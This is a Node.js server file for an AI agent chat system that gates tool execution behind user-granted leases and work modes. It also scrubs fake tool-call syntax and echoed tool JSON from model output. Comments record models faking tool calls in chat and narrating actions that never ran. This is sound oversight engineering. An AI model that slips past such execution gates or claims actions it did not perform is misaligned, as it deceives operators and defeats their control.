const BABYSITTER = require('./lib/babysitter/pipeline'); // Capability Gate: intent-class tool narrowing
const AUTO_PLAN = require('./lib/auto-plan');        // long-horizon PLAN→verify→EXECUTE state machine
const _planApproved = new Set();                    // sessionIds whose plan passed verifyPlan()
const EXEC = require('./lib/execution-lease');       // authorizeExecution + assertExecutionLease
const CG = require('./lib/execution-claim-gate');    // LARP gate: claims vs real tool evidence
const RT = require('./lib/runtime-truth');           // runtime truth: envelope injection + capability-promise gate
const RR = require('./lib/routing-receipt');         // CANONICAL route truth: RoutingReceipt + router state + pin API
const FILTER = require('./lib/stream-thinking-filter'); // STREAM LAW: stateful thinking filter
// AUTO OUTPUT-QUALITY GATE: detect catastrophic joined-word model output (word soup).
// Never auto-inserts spaces; in AUTO only, a souped candidate is retried on another provider.
// PROVIDER TOOL SENTINEL LAW: models sometimes emit fake tool syntax
// (<|tool_call_start|>[bash(...)]<|tool_call_end|>) inside plain CHAT. This is
// LARP, not execution. Strip it from the visible reply, log the attempt, never
// execute. Applies regardless of route — even lease paths parse canonically.
// Streaming scrubber: sentinels split across chunks ("<|tool_" + "call_start|>"),
// so we hold back a possible-partial tail and only release text that cannot be
// part of a sentinel. Also suppresses the [bash(...)] payload between markers.
class _SentinelScrubber {
  constructor(sessionId) {
    this.sessionId = sessionId || null;
    this.buf = '';
    this.inSentinel = false;
    this.logged = false;
    this.HOLD_MAX = 64;
  }
  _holdLen() {
    // longest suffix that could be a sentinel prefix/suffix
    for (let n = Math.min(this.HOLD_MAX, this.buf.length); n > 0; n--) {
      const tail = this.buf.slice(-n);
      if (this.inSentinel ? '<|tool_call_end|>'.startsWith(tail.slice(-17)) || '</|'.includes(tail[0]) === false && '<|tool_call_end|>'.startsWith(tail) : '<|tool_call_start|>'.startsWith(tail) || '<|tool_call_end|>'.startsWith(tail)) return n;
    }
    return 0;
  }
  push(chunk) {
    this.buf += String(chunk || '');

    // TOOL ECHO HOLD: if buffer begins with {"tool" (possibly split across chunks),
    // wait until the JSON object closes before deciding to strip it.
    const trimmed = this.buf.replace(/^\s+/, '');
    // Hold while trimmed is a strict PREFIX of the echo opener too (split chunks).
    if (!this.inSentinel && trimmed.length > 0 && trimmed.length < 7 && '{"tool"'.startsWith(trimmed)) {
      return '';   // incomplete — keep buffering
    }
    if (!this.inSentinel && /^\{"tool"/.test(trimmed)) {
      // count brace depth over trimmed
      let depth = 0, q = false, esc = false, closed = -1;
      for (let i = 0; i < trimmed.length; i++) {
        const ch = trimmed[i];
        if (esc) { esc = false; continue; }
        if (ch === '\\') { esc = true; continue; }
        if (ch === '"') { q = !q; continue; }
        if (q) continue;
        if (ch === '{') depth++;
        else if (ch === '}') { depth--; if (depth === 0) { closed = i; break; } }
      }
      if (closed === -1) {
        // Robustness: unbalanced quotes from a bad chunk split could buffer forever.
        // Fail open past 4KB — release the text rather than eat the whole reply.
        if (trimmed.length > 4096) {
          this.buf = '';
          return trimmed;
        }
        return '';   // incomplete — keep buffering
      }
      // complete object: drop it plus trailing whitespace/newlines
      let dropEnd = closed + 1;
      while (dropEnd < trimmed.length && /\s/.test(trimmed[dropEnd])) dropEnd++;
      this.buf = trimmed.slice(dropEnd);
      if (!this.logged) { safeLog('CHAT', `UNAUTHORIZED_TOOL_ATTEMPT session=${this.sessionId} — tool-call echo stripped from stream`); this.logged = true; }
      return this.push('');           // continue processing remainder
    }

    let out = '';
    for (;;) {
      if (this.inSentinel) {
        const end = this.buf.indexOf('<|tool_call_end|>');
        if (end === -1) { this.buf = ''; return out; }   // swallow entire payload
        this.buf = this.buf.slice(end + '<|tool_call_end|>'.length);
        this.inSentinel = false;
        continue;
      }
      const start = this.buf.indexOf('<|tool_call_start|>');
      // also catch bare end-markers without a seen start
      const bareEnd = this.buf.indexOf('<|tool_call_end|>');
      if (start === -1 && bareEnd === -1) break;
      const cut = start === -1 ? bareEnd : start;
      out += this._emit(this.buf.slice(0, cut));
      if (!this.logged) { safeLog('CHAT', `UNAUTHORIZED_TOOL_ATTEMPT session=${this.sessionId} — tool sentinel stripped from stream`); this.logged = true; }
      if (start !== -1) { this.inSentinel = true; this.buf = this.buf.slice(start + '<|tool_call_start|>'.length); }
      else { this.buf = this.buf.slice(bareEnd + '<|tool_call_end|>'.length); }
    }
    // hold back a partial-marker tail
    let hold = 0;
    for (let n = Math.min(this.HOLD_MAX, this.buf.length); n > 0; n--) {
      const tail = this.buf.slice(this.buf.length - n);
      if ('<|tool_call_start|>'.startsWith(tail) || '<|tool_call_end|>'.startsWith(tail)) { hold = n; break; }
    }
    if (hold) { out += this._emit(this.buf.slice(0, this.buf.length - hold)); this.buf = this.buf.slice(this.buf.length - hold); }
    else { out += this._emit(this.buf); this.buf = ''; }
    return out;
  }
  _emit(text) {
    if (!text) return '';
    // strip stray [bash(...)] payloads outside markers too
    let cleaned = text.replace(/\[bash\([^\]]*\)\]\s*/g, '');
    // TOOL ECHO LAW: models sometimes re-print their own call as text —
    // {"tool":"ls","args":{...}} lines are LARP residue, never operator content.
    cleaned = cleaned.replace(/\{\s*"tool"\s*:\s*"[^"]*"\s*,\s*"args"\s*:\s*\{[^{}]*(\{[^{}]*\}[^{}]*)*\}\s*\}\s*\n?/g, '');
    return cleaned;
  }
  flush() {
    // end of stream — release the hold EXCEPT an unterminated sentinel swallows all
    if (this.inSentinel) { this.buf = ''; return ''; }
    const rest = this.buf; this.buf = '';
    return rest.replace(/\[bash\([^\]]*\)\]\s*/g, '');
  }
}
function _stripToolSentinels(text, sessionId) {
  const t = String(text || '');
  if (!t.includes('<|')) return t;
  if (TOOL_SENTINEL_RE.test(t)) {
    safeLog('CHAT', `UNAUTHORIZED_TOOL_ATTEMPT session=${sessionId || '?'} — provider tool sentinel stripped from visible output`);
    TOOL_SENTINEL_RE.lastIndex = 0;
  }
  return t.replace(TOOL_SENTINEL_RE, '').replace(/\[bash\([^\]]*\)\]\s*/g, '').replace(/\n{3,}/g, '\n\n').trimEnd();
}
function _isWordSoup(text) {
  const t = String(text || '').trim();
  if (t.length < 80) return false;                    // short replies can't prove soup
  const words = t.split(/\s+/);
  const avgLen = t.length / words.length;
  if (words.length < 12 && avgLen > 14) return true;   // few very long unbroken tokens
  const monsters = words.filter(w => w.length > 26 && !/[\/_\-.:@#]/.test(w)).length;
  return monsters / words.length > 0.25;               // quarter of tokens are 26+ char blobs
}
// Module-level agent-loop binding — every chat surface (SSE + JSON) shares this.
// Per-function destructuring previously caused TDZ ReferenceErrors across scopes.
const { runAgent, getAgentTools, buildChatSystemPrompt } = require('./lib/agent-loop');
const CHAT_HISTORY_TURNS = Number(process.env.PURPCLAW_CHAT_HISTORY_TURNS || 40);

// ── Execution trace event store ─────────────────────────────────────────────────
// Canonical durable record of every meaningful execution state transition.
// Survives cockpit reload: the cockpit emits events as they arrive via SSE,
// and reads them back on reload to reconstruct the full ordered trail.
// Schema per event: { runId, seq, timestamp, type, tool, status, durationMs,
//                     summary, provider, model, tokens, detail }
const TRACE_EVENTS = new Map(); // key: sessionId → { events:[], seq:number }
const TRACE_SEQ    = new Map(); // key: sessionId → running sequence counter
const TRACE_META   = new Map(); // key: sessionId → { runId, startedAt, provider, model, tokens, status }
// Reacharound state: keyed by sessionId → current verdict + scores for cockpit display
const REACHAROUND_STATES = new Map();

function traceAppend(sessionId, event) {
  if (!sessionId) return;
  if (!TRACE_EVENTS.has(sessionId)) { TRACE_EVENTS.set(sessionId, { events: [], seq: 0 }); TRACE_SEQ.set(sessionId, 0); }
  const entry = TRACE_EVENTS.get(sessionId);
  const seq = (TRACE_SEQ.get(sessionId) || 0) + 1;
  TRACE_SEQ.set(sessionId, seq);
  entry.events.push({ seq, timestamp: Date.now(), ...event });
  if (entry.events.length > 2000) entry.events = entry.events.slice(-2000);
}
function traceSetMeta(sessionId, meta) {
  if (!sessionId) return;
  TRACE_META.set(sessionId, { ...(TRACE_META.get(sessionId) || {}), ...meta, updatedAt: Date.now() });
}
function traceGet(sessionId) {
  return { events: (TRACE_EVENTS.get(sessionId || '') || { events: [] }).events, meta: TRACE_META.get(sessionId || '') || null };
}
function traceClear(sessionId) {
  TRACE_EVENTS.delete(sessionId || ''); TRACE_SEQ.delete(sessionId || ''); TRACE_META.delete(sessionId || '');
}

function getChatHistory(sessionId) {
  if (!sessionId) return [];
  const session = SESSION_REPOSITORY.loadSession(sessionId);
  return session ? session.messages.slice(-CHAT_HISTORY_TURNS) : [];
}
function appendChatTurn(sessionId, role, content, source = 'chat', telemetry = null) {
  if (!sessionId || !content) return;
  // AUTO-CREATE: unknown session ids (phone surfaces mint their own) get a
  // session row on first write — otherwise appendMessage trips the FK gate.
  if (!SESSION_REPOSITORY.loadSession(sessionId)) {
    try {
      SESSION_REPOSITORY.createSession(`Surface ${source || 'chat'}`, '', '', { id: sessionId, source });
    } catch (e) { /* race: another lane created it first */ }
  }
  // P0 2026-08-24: append-only single-row INSERT. No read-modify-write of the
  // whole transcript — the old loadSession→push→saveSession path was
  // last-writer-wins and ate messages on any interleaved write.
  const turn = SESSION_REPOSITORY.appendMessage(sessionId, {
    role, content: String(content), metadata: { source, ...(telemetry && typeof telemetry === 'object' ? { telemetry } : {}) },
  });
  if (role === 'assistant' || role === 'system') {
    try {
      const fish = require('./lib/fish-runtime');
      fish.runFishOnAssistantTurn({
        sessionId, role, content: String(content), meta: { source },
      });
    } catch (_) { /* fish not wired or threw — never block the turn */ }
  }
  return turn;
}

async function handleChatStream(req, res) {
  // Client disconnect must never kill the process or throw EPIPE out of
  // res.write()/res.end() later in the stream loop. Mark the response dead and
  // swallow write errors; the run loop checks sseDead before each event.
  let sseDead = false;
  res.on('error', (e) => { sseDead = true; try { res.destroy(); } catch (_) {} });
  req.on('error', () => { sseDead = true; });
  req.on('close', () => { sseDead = true; });
  const _sseEvent = sseEvent;
  // Shadow writes through a guard: if the socket is gone, drop events silently.
  const resGuard = new Proxy(res, {
    get(t, p) {
      if (p === 'write' || p === 'end') {
        return (...args) => {
          if (sseDead) return false;
          try { return t[p](...args); } catch (e) {
            if (e && (e.code === 'EPIPE' || e.code === 'ERR_STREAM_WRITE_AFTER_END' || e.code === 'ERR_STREAM_DESTROYED')) { sseDead = true; return false; }
            throw e;
          }
        };
      }
      return t[p];
    },
  });
  void _sseEvent;
  let body = null;
  try { body = await parseBody(req); }
  catch (e) {
    sseStart(res);
    sseEvent(res, 'error', { error: 'bad body: ' + e.message });
    return res.end();
  }
  const { message, spawnAgents = false, source = 'chat' } = body;
  // runAgent/getAgentTools/buildChatSystemPrompt now destructured ONCE at module
  // level (see AGENT_LOOP binding near the top of this file) — both handleChatStream
  // and the /api/chat JSON path use them; per-function re-destructuring caused TDZ.
  // Accept a client session id; fall back to the surface name so a surface that
  // does not send one still gets continuity instead of amnesia.
  const sessionId = body.session_id || body.sessionId || `surface:${source}`;
  // TURN LINEAGE: a retry of a failed turn must join the SAME turn's lineage,
  // not start a conceptually new one. The client sends attemptId on retry
  // (same turnId + incremented attempt); server stamps every SSE event and the
  // terminal event with both, so the UI can replace-in-place instead of
  // stacking duplicate assistant cards.
  const turnId = body.turnId || ('turn_' + Date.now().toString(36));
  const attemptId = body.attemptId || (turnId + '_a1');
  const attemptN = (Number(body.attempt) || 1);
  // NOTE: missionId is resolved later (semantic intake, ~line 1412) — SET_SSE_CTX
  // here carries only what exists at this point. The mission-scoped SET_SSE_CTX
  // further down re-sets it with the real value.
  SET_SSE_CTX({ sessionId, runId: null, turnId, attemptId });
  // ── RECONNECT LAW: replay buffered events the client missed, then go live.
  // Client sends Last-Event-ID header or lastSeenEventId in body; every missed
  // event is re-emitted with its ORIGINAL id so dedupe stays idempotent.
  const lastSeen = req.headers['last-event-id'] || body.lastSeenEventId || null;
  if (lastSeen) {
    sseStart(res);
    for (const ev of SSE_REPLAY.replay(sessionId, String(lastSeen))) {
      try {
        res.write(`id: ${ev.id}\nevent: ${ev.event}\ndata: ${JSON.stringify(ev.data)}\n\n`);
      } catch (_) { break; }
    }
  }
  const priorHistory = getChatHistory(sessionId);
  if (!message) {
    sseStart(res);
    sseEvent(res, 'error', { error: 'message required' });
    return res.end();
  }

  // ── EXECUTION LEASE — Gate 1: authorizeExecution ────────────────────────
  // Authorize execution BEFORE any routing. Explicit user gesture (slash or
  // UI action) creates a lease; everything else returns null = no execution.
  // The lease is threaded through runAgent → toolContext → TOOLS.invoke so that
  // the actual executor can assert it even if routing is wrong.
  const executionLease = EXEC.authorizeExecution({
    message,
    executionIntent: body.executionIntent,
    executionAction: body.executionAction,
    driveMode: body.driveMode,
    autonomyGrant: body.autonomyGrant,
    sessionId,
  });

  // ── WORK_SESSION AUTHORITY (two-mode law: CHAT = mouth, WORK = mouth+hands) ──
  // operatorMode=WORK is a trusted operator gesture that mints ONE persistent
  // session authority. It does NOT evaporate after each reply. CHAT revokes it.
  // Per-turn leases still work; WORK_SESSION is the persistent layer above them.
  let workSession = null;
  const _opMode = String(body.operatorMode || '').toUpperCase();
  if (_opMode === 'WORK') {
    // Selector flip to WORK is itself the operator gesture (Eddie's law,
    // 2026-08-24): mint/refresh the persistent session on EVERY WORK turn.
    // A per-turn lease or executionIntent still refines it, but is no longer
    // required — otherwise the next turn silently loses all tools again.
    workSession = EXEC.mintWorkSession({ sessionId, source: 'UI_ACTION' });
  } else if (_opMode === 'CHAT') {
    EXEC.revokeWorkSession();
  }
  // WORK = Agent-Actions access rung (Eddie's law: no per-action re-approval
  // inside a WORK session). The composer's explicit rung still wins if the
  // client sent one; only the silent default ('review') gets upgraded.
  if (_opMode === 'WORK' && (!body.envelope || !body.envelope.access)) {
    body.envelope = Object.assign({}, body.envelope || {}, { access: 'agent-actions' });
  }
  // Authority for THIS turn = per-turn lease OR active WORK_SESSION.
  const turnAuthority = executionLease
    || (workSession ? {
      executionId: 'work_' + (workSession.sessionId || 'session'),
      sessionId,
      initiatedBy: 'user',
      source: 'WORK_SESSION',
      command: null,
      action: body.executionAction || 'RUN',
      authorized: true,
      createdAt: workSession.createdAt,
      revoked: false,
    } : null);

  // ── BINDING RESOLUTION — SCOPE, NOT AUTHORITY ──────────────────────────
  // GESTURE LAW (re-affirmed): bindings[] describe user-selected capability
  // SCOPE. They are metadata, never proof of an execution gesture. A client
  // that can POST /api/chat can fabricate bindings — so bindings alone mint
  // NOTHING. Authority comes only from:
  //   1. a typed canonical slash command        (authorizeExecution → SLASH_COMMAND)
  //   2. an allowlisted explicit UI action       (authorizeExecution → UI_ACTION)
  // When a legitimate lease DOES exist, bindings refine its capability scope
  // via the side-map (leases are frozen — never mutated).
  const bindings = Array.isArray(body.bindings) ? body.bindings : [];
  // Effective authority: per-turn lease first, else persistent WORK_SESSION.
  // WORK_SESSION keeps tools advertised across turns — no re-gesture per message.
  const effectiveLease = turnAuthority;
  if (effectiveLease && bindings.length) {
    // LEASE FREEZE LAW: leases are Object.freeze'd. Never mutate them — the
    // 22:02 crash (Cannot define property bindings, object is not extensible)
    // was exactly that assignment. Side-map keyed by executionId carries scope.
    try { SLASH_BINDINGS.set(effectiveLease.executionId, bindings); }
    catch (_provErr) { safeLog('LEASE', 'binding scope store failed: ' + _provErr.message); }
  }

  sseStart(res);
  const _msgReceivedAt = Date.now();
  sseEvent(res, 'phase', { phase: 'received', state: 'RECEIVED', durationMs: 0,
    message: message.slice(0, 100) });
  sseEvent(res, 'phase', { phase: 'thinking', state: 'THINKING',
    durationMs: Date.now() - _msgReceivedAt });

  // Approval heartbeat helpers MUST live at handleChatStream FUNCTION scope —
  // NOT inside the try block. Block-scoped function declarations are invisible
  // to the sibling catch below, which crashed every error-path stream with
  // "clearApprovalHeartbeat is not a function" (recurring P0; this is the
  // third time parallel edits have re-nested them).
  let _approvalHeartbeat = null;
  function clearApprovalHeartbeat() {
    if (_approvalHeartbeat) { clearInterval(_approvalHeartbeat); _approvalHeartbeat = null; }
  }
  function startApprovalHeartbeat() {
    clearApprovalHeartbeat();
    _approvalHeartbeat = setInterval(() => {
      sseComment(res, 'approval-wait');
    }, 20_000);
  }

  try {
    // SLASH-ONLY EXECUTION LAW (SSE surface) — same table as CLI and /api/chat
    // non-stream path. A message starting with '/' dispatches deterministically;
    // it must never reach the LLM as chat text.
    if (typeof message === 'string' && message.startsWith('/')) {
      const ASK_CMDS = require('./lib/commands/ask.js');
      const table = ASK_CMDS.SLASH_COMMANDS || ASK_CMDS.default?.SLASH_COMMANDS || ASK_CMDS;
      const spaceIdx = message.indexOf(' ');
      const rawName = spaceIdx === -1 ? message : message.slice(0, spaceIdx);
      // SLASH LAW: command names are case-insensitive (/TOOLS === /tools).
      // Table is lowercase; normalize the lookup so uppercase never falls
      // through to "unknown".
      const lookupName = rawName.toLowerCase();
      const cmd = table[lookupName] || table[rawName];
      const cmdName = cmd ? (table[rawName] ? rawName : lookupName) : rawName;
      const cmdArgs = spaceIdx === -1 ? '' : message.slice(spaceIdx + 1);
      const slashCtx = { model: process.env.LLM_MODEL || null, provider: process.env.LLM_PROVIDER || null };
      if (cmd && typeof cmd.run === 'function') {
        sseEvent(res, 'phase', { phase: 'slash', state: 'DISPATCHED', command: cmdName });
        // async slash handlers (orchestrator) must be awaited — never String(Promise)
        Promise.resolve()
          .then(() => cmd.run(cmdArgs, slashCtx))
          .then((out) => {
            sseFinal(res, { ok: true, slash: cmdName, reply: String(out) });
            res.end();
          })
          .catch((err) => {
            sseEvent(res, 'phase', { phase: 'slash', state: 'FAILED', command: cmdName });
            sseFinal(res, { ok: false, slash: cmdName, reply: `slash failed: ${err.message}`, code: err.code || null });
            res.end();
          });
        return;
      }
      sseEvent(res, 'phase', { phase: 'slash', state: 'UNKNOWN', command: cmdName });
      sseFinal(res, { ok: false, slash: cmdName, reply: `unknown command: ${cmdName}`, available: Object.keys(table) });
      return res.end();
    }
    // Explicit, high-confidence computer commands are deterministic routing
    // work, not language-model work. Resolve them before provider selection so
    // a rate-limited cloud brain cannot prevent a native operation. Unknown or
    // ambiguous language still falls through to the full agent loop below.
    const semantic = await SEMANTIC_CHAT.execute({
      message,
      envelope: body.envelope || {},
      sessionId,
      source,
      operatorConfirmed: body.operatorConfirmed === true,
      context: { cwd: body.cwd || process.cwd(), workspaceRoot: PURP_DIR },
    });
    if (semantic.handled) {
      // GATE LAW: deterministic execution is real capability execution.
      // No user-originated lease → refuse, stay in CHAT, never dispatch.
      if (!effectiveLease) {
        const refused = 'That request needs execution, but no execution lease was created (plain chat mode). Use a slash command or an explicit Execute gesture.';
        const _cap = semantic.resolution && semantic.resolution.matched && semantic.resolution.matched.capability || null;
        safeLog('GATE1', `[deterministic-refused] capability=${_cap} msg="${String(message).slice(0, 40)}"`);
        sseEvent(res, 'phase', { phase: 'routing', route: 'CHAT' });
        sseEvent(res, 'token', { content: refused });
        // MODE-OFFER LAW: the RUNTIME detected intent-mismatch (execution intent,
        // CHAT authority) — it must tell the surface, never leave the LLM or the
        // operator to guess. Structured field only; cockpit renders the controls.
        sseEvent(res, 'mode-offer', {
          kind: 'EXECUTION_INTENT_NO_LEASE',
          capability: _cap,
          offers: ['RUN_ONCE', 'SWITCH_TO_WORK'],
        });
        appendChatTurn(sessionId, 'user', message, source);
        appendChatTurn(sessionId, 'assistant', refused, source);
        sseEvent(res, 'phase', { phase: 'done' });
        sseEvent(res, 'done', {
          ok: true,
          status: 'complete',
          reply: refused,
          model: null,
          providerStatus: 'execution-not-user-initiated',
          toolCalls: 0,
          source,
          sessionId,
          modeOffer: { kind: 'EXECUTION_INTENT_NO_LEASE', capability: _cap, offers: ['RUN_ONCE', 'SWITCH_TO_WORK'] },
          historyTurns: getChatHistory(sessionId).length,
        });
        return res.end();
      }
      const intent = semantic.resolution.matched;
      sseEvent(res, 'phase', { phase: 'routing', route: 'deterministic-intent' });
      sseEvent(res, 'tool-call', { tool: intent.capability, args: intent.args, capsuleId: null });
      sseEvent(res, 'tool-result', {
        tool: intent.capability,
        ok: !!semantic.ok,   // always boolean
        code: semantic.dispatch.result && semantic.dispatch.result.status || (semantic.ok ? 'SUCCESS' : 'FAILURE'),
        capsuleId: null,
        content: JSON.stringify(semantic.dispatch.result && semantic.dispatch.result.data || {
          reason: semantic.dispatch.reason,
          error: semantic.dispatch.error,
        }).substring(0, 2000),
      });
      sseEvent(res, 'token', { content: semantic.reply, model: semantic.model });
      appendChatTurn(sessionId, 'user', message, source);
      appendChatTurn(sessionId, 'assistant', semantic.reply, source);
      sseEvent(res, 'phase', { phase: 'done' });
      sseEvent(res, 'done', {
        ok: semantic.ok,
        status: semantic.ok ? 'complete' : 'failed',   // explicit, never null
        reply: semantic.reply,
        model: semantic.model,
        providerStatus: semantic.ok ? 'local-control' : 'refused-or-failed',
        toolCalls: 1,
        source,
        sessionId,
        missionId: semantic.mission && semantic.mission.missionId,
        verification: semantic.dispatch.verification || null,
        historyTurns: getChatHistory(sessionId).length,
      });
      return res.end();
    }

    // ── CHAT FAST PATH ─────────────────────────────────────────────────────────
    // Conversational messages (greetings, casual chat, short exchanges) are
    // replied to directly — no agent loop, no tool overhead, no tool-calling
    // inference. Classify as CHAT or QUESTION here to fast-track them.
    // buildChatSystemPrompt comes from the module-level AGENT_LOOP binding.
    // This avoids MiniMax spending inference budget on "should I call a tool?"
    // for messages that are clearly just conversation.
    //
    // GATE 1 — EXECUTION AUTHORIZATION OVERRIDE:
    // Semantic intent (classifyIntentEx) tells WHAT the message describes.
    // Execution authorization tells whether the user is ALLOWED to execute.
    // These are separate. Even if semantic intent = EXECUTE:
    //   - no effectiveLease → final route MUST BE CHAT
    //   - lease exists     → may enter runAgent
    // Plain conversational messages must never enter runAgent regardless of
    // semantic content (action verbs, capability mentions, live-state queries).
    const chatIntent = TA.classifyIntentEx(message);
    const chatRoute = chatIntent.route;
    // GATE 1 LAW: the lease selects the lane. Semantic intent is TELEMETRY ONLY —
    // it never grants execution. No lease → finalRoute = CHAT, always.
    // LEASE-DOWNGRADE LAW (P0 fix): a lease with semantic intent CHAT/QUESTION
    // used to produce finalRoute=CHAT + tool schemas — the provider then emitted
    // tool calls whose echoes were stripped mid-stream ("UNAUTHORIZED_TOOL_ATTEMPT"),
    // so Purp narrated actions that never ran. A lease is an explicit operator
    // gesture: it MUST route to EXECUTE, never downgrade to chat-with-tools.
    const finalRoute = effectiveLease
      ? (chatRoute === TA.INTENT_CLASSES.CHAT || chatRoute === TA.INTENT_CLASSES.QUESTION
          // DRIVE AUTONOMOUS + minimum-necessary-action: an autonomy grant does
          // NOT upgrade pure conversation to EXECUTE. Only gesture/action leases
          // force the upgrade; autonomy leases respect semantic intent so "8 x 7"
          // stays CHAT while "go on the hunt" (intent=EXECUTE) self-routes.
          ? (effectiveLease.source === 'UI_AUTONOMY_GRANT'
              ? 'CHAT'
              : TA.INTENT_CLASSES.EXECUTE)
          : chatRoute)
      : 'CHAT';
    // WORK SESSION LAW: an active execution lease means the operator armed
    // WORK — the turn ALWAYS goes through the agent loop so tools can fire.
    // The chat-fast lane is only for genuine no-lease conversation.
    const IS_CHAT_FAST = !effectiveLease && (
      finalRoute === TA.INTENT_CLASSES.CHAT
      || finalRoute === TA.INTENT_CLASSES.QUESTION
    );
    // GATE 1 DIAGNOSTIC: log the decision so we can trace why plain chat enters runAgent.
    safeLog('GATE1', `[chat] effectiveLease=${effectiveLease ? effectiveLease.source : 'null'} intent=${chatRoute} finalRoute=${finalRoute} IS_CHAT_FAST=${IS_CHAT_FAST} msg="${String(message).slice(0, 40)}"`);
    let _chatOpts = null; // handler-scope: telemetry (providerAttempts receipt) reads it after the runAgent path too
    let _envelope = null; // handler-scope: GATE3/4 capability-promise check reads it in the runAgent path too
    let _streamOpts = null; // handler-scope: attempt-1 opts; receipts survive try-block scope exit
    let _mode = 'CHAT'; // handler-scope: requested route; read by BOTH lanes (runAgent mode field at :1767 was TDZ-crashing on it)
    // PROVIDER ATTEMPTS RECEIPT CONTRACT: every terminal telemetry object reads
    // this. Declared at handler scope so BOTH lanes (chat-fast and runAgent)
    // consume the same shape — never undefined, even with zero attempts.
    let _providerAttemptsReceipt = [];
    if (IS_CHAT_FAST) {
      // ONE ROUTER LAW: the persisted operator pin (model-override.json via
      // /api/llm/pin) is authority when the request body doesn't name a model.
      // EXPLICIT AUTO LAW (TVG S6, 2026-08-26): a body naming provider OR model
      // as 'auto' is an explicit scored-pool request — the persisted pin must
      // NOT be adopted, or AUTO turns get silently stamped MANUAL. Parity with
      // the nonstream lane's AUTO POOL ISOLATION LAW (~:6600). Only an ABSENT
      // field defers to the operator's standing pin.
      const _explicitAuto = (body.provider === 'auto' || body.provider === 'default' || body.model === 'auto');
      const _routerPin = _explicitAuto ? null : RR.getRouterState().manual_pin;
      const _chatModel = (body.model && body.model !== 'auto') ? body.model : (_routerPin && _routerPin.model ? _routerPin.model : undefined);
      let _chatProvider = (!_explicitAuto && body.provider && body.provider !== 'auto' && body.provider !== 'default') ? body.provider : (_routerPin && !_explicitAuto && _routerPin.provider ? _routerPin.provider : undefined);
      // MANUAL PIN FAIL-CLOSED LAW (boundary): an unknown provider name must
      // 400 here — never fall through to a default pool. A pin that names a
      // provider that does not exist is an operator error, and silently
      // routing it to some other provider is the exact bug this lane kills.
      if (_chatProvider && !LLM.PROVIDERS[_chatProvider]) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ ok: false, error: 'UNKNOWN_PROVIDER_PIN', detail: `provider '${_chatProvider}' is not registered; manual pins must fail closed`, knownProviders: Object.keys(LLM.PROVIDERS) }));
      }
      // 'auto'/'default' must fall through to streamChatAuto — pinning those
      // strings takes the MANUAL streamChat path and silently bypasses
      // affinity / quality-gate / failover.
      const chatHistory = getChatHistory(sessionId);
      // buildChatSystemPrompt = full PurpClaw identity/personality/context,
      // with capability AWARENESS but no executable tool schemas.
      // This is the key contract: chat knows what exists but cannot invoke it.
      let chatSystemPrompt = buildChatSystemPrompt({
        cwd: body.cwd || process.cwd(),
        workspace: body.workspaceRoot || process.cwd(),
        historyLength: chatHistory.length,
        turnNumber: chatHistory.length + 1,
        model: _chatModel || undefined,
      });
      // RUNTIME STATE TRUTH (Gate 1 of runtime-truth): authoritative envelope
      // computed from REAL state — lease registry + tool registry + workspace
      // fs probe. The model receives this BEFORE generation and never infers.
      _mode = String(body.interactionMode || body.mode || 'CHAT').toUpperCase(); // assign handler-scope decl (was const here → TDZ crash in runAgent lane)
      // NOTE: getAgentTools() only — _explicitTools (binding-narrowed set) is
      // declared further down (TDZ). Binding narrowing still applies at
      // provider time and its true count rides the done-event telemetry.
      _envelope = RT.buildRuntimeEnvelope({
        executionLease,
        toolIds: (executionLease ? getAgentTools() : [])
          .map(t => (t.function && t.function.name) || t.name),
        body,
        // ROUTE TRUTH: requested EXECUTE/SWARM without a valid gesture-minted
        // lease downgrades to CHAT — the model must see that downgrade.
        finalRoute: executionLease ? _mode : 'CHAT',
        routeReason: !executionLease && _mode !== 'CHAT' ? 'EXECUTION_NOT_AUTHORISED' : null,
        // INTAKE TRUTH: session attachment metadata rides the envelope so CHAT
        // can name/see files with zero authority (knowledge ≠ analysis).
        attachments: Array.isArray(body.attachments) ? body.attachments : [],
        contextSources: { filesActuallyRead: [], toolReceipts: 0 },
      });
      chatSystemPrompt += RT.renderRuntimeStateBlock(_envelope);
      // PROVIDER INPUT LAW: command-truth / capability block must ride EVERY
      // chat-lane system prompt (was unwired → PROVIDER_INPUT_LAW_VIOLATION).
      const _capBlock = require('./lib/capability-state').renderCapabilityBlock(
        require('./lib/capability-state').buildCapabilityState({
          tools: effectiveLease ? getAgentTools() : [],
          hasExecutionLease: !!effectiveLease,
          route: _mode || 'CHAT',
          leaseAction: effectiveLease ? (effectiveLease.action || null) : null,
        })
      );
      if (_capBlock) chatSystemPrompt += '\n\n' + _capBlock;
      if (_mode === 'PLAN') {
        // PLAN contract: structured plan output only. No effects, no tool calls —
        // even if a lease somehow exists, PLAN is read-and-reason, never act.
        chatSystemPrompt += `\n\nPLAN MODE CONTRACT\nYou are in PLAN mode. Produce a structured, numbered implementation plan for the request:\n- Goal restated in one line.\n- Numbered steps with concrete file paths / commands / capability names where relevant.\n- Risks & unknowns section.\n- Verification step last.\nDo NOT narrate executing anything. Do NOT claim actions were performed. Output the plan and stop.`;
      }
      const chatMessages = [
        { role: 'system', content: chatSystemPrompt },
        ...chatHistory,
        { role: 'user', content: message },
      ];
      // GATE 2 LAW: no lease → zero tool schemas reach the provider.
      // SLASH BINDINGS (§7): explicit bound set narrows the caps when present.
      // BABYSITTER CAPABILITY GATE: granted caps are additionally intersected
      // with an intent-class allowlist (EXECUTE → full set; STATUS_QUERY →
      // read-only; CHAT/QUESTION → none). Denied names go to telemetry.
      const _bindingCaps = bindings.length ? computeEffectiveCaps(bindings) : null;
      const _intentAllow = TA.capabilityAllowlist(finalRoute);
      const _queryIntent = finalRoute === TA.INTENT_CLASSES.STATUS_QUERY || finalRoute === TA.INTENT_CLASSES.PROVENANCE_QUERY;
      let _explicitChatTools = null;
      let _capDenied = [];
      if (_bindingCaps && _bindingCaps.caps.length) {
        _explicitChatTools = getAgentTools().filter(t => {
          const n = (t.function && t.function.name) || t.name;
          let ok = _bindingCaps.caps.includes(n);
          if (ok && _intentAllow && typeof _intentAllow.has === 'function') ok = _intentAllow.has(n);
          if (ok && _queryIntent && !TA.isReadonlyToolName(n)) ok = false;
          if (!ok) _capDenied.push(n);
          return ok;
        });
        if (_explicitChatTools.length === 0 && _capDenied.length > 0) _explicitChatTools = []; // hard-empty beats fallback
      } else if (_intentAllow && typeof _intentAllow === 'object' && _intentAllow.size === 0) {
        _explicitChatTools = []; // CHAT/QUESTION with no bindings: still zero tools
      }
